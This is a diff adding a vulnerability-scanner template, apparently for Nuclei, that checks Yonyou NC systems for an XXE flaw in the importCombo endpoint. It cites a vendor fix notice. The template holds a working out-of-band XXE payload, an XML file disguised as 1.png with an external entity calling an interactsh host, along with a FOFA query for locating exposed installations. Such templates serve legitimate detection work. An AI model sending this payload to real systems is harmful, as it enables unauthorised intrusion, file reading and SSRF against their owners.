@@ -1,0 +1,40 @@
+id: yonyou-nc-importcimbo-xxe
+
+info:
+  name: 用友NC系统ComboOperTools存在XML实体注入漏洞
+  author: bl
+  severity: high
+  description: |
+    2025年8月10日，用友官方发布关于NC系统ComboOperTools存在XML实体注入漏洞的修复通告：https://security.yonyou.com/#/noticeInfo?id=725 ，宣布修复了NC系统importCombo接口的XXE漏洞，攻击者通过构造恶意XML文件，利用 importCombo 接口上传并解析，实现任意文件读取或SSRF攻击等作，进而可能导致敏感信息泄露或进一步的系统入侵。
+  reference:
+    - https://mp.weixin.qq.com/s/T8yGTSXe6P4llFLitXE4sA
+  classification:
+    cwe-id: CWE-611
+  metadata:
+    fofa-query: app="用友-UFIDA-NC"
+  tags: Yonyou-UFIDA-NC
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/portalcombo/importCombo?pageId=login HTTP/1.1
+        Host:
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="file"; filename="1.png"
+        
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
+        <root/>
+        ------WebKitFormBoundary--
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - 'dns'
